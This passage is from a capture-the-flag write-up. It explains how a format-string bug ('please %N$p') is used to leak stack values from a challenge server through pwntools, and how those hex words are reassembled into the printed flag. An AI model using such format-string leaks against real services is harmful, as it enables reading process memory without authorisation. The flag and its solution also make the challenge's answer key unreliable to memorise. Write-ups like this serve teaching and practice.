   2. We take the output. It's formatted as `b'please 0x4444434342424141 to you too!\n'`. So we remove the first 9 characters, and last 15 characters to isolate the value we need.
   3. We remove the 0x and append them into a long string of all characters.
   4. We iterate through the string, taking 2 characters each time to represent a byte and put them in `flag_bytes`
   ```
   flag_bytes = ["44", ""44", "43", "43", ...]
   ```
   5. Once we write 8 bytes, we convert it into one word and put them in flag_word. This is done because we get 8 bytes from each server connection and this helps to isolate each returns and reverse them later.
   ```
   flag_words = [['44', '44', '43', '43', '42', '42', '41', '41'], ['48', '48', '47', '47', '46', '46', '45', '45'], ['4c', '4c', '4b', '4b', '4a', '4a', '49', '49'], ['50', '50', '4f', '4f', '4e', '4e', '4d', '4d']]
   ```

   6. We take each word, reverse them, convert each byte into printable ASCII, put them in a list and join them to get the flag,

  ```
  flag{pl3as3_pr1ntf_w1th_caut10n_
  ``` 
  is what we get from the program. We don't get the last word because it's short of 3 bits. So we modify the python script to add 3 0's before the last output (before because once it's reversed it'll go to the end.)

  7. Run the script and we have a flag.


```
❯ python3 ape.py
ape.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendline('please %' + str(i) + '$p')
336c707b67616c66
6e3172705f337361
5f687431775f6674
5f6e303174756163
a7d6c78336139
flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
\x00
```

Refer to the python script for more clearance, it's not the most efficient solution but enough to explain the workflow.

##### Flag: flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}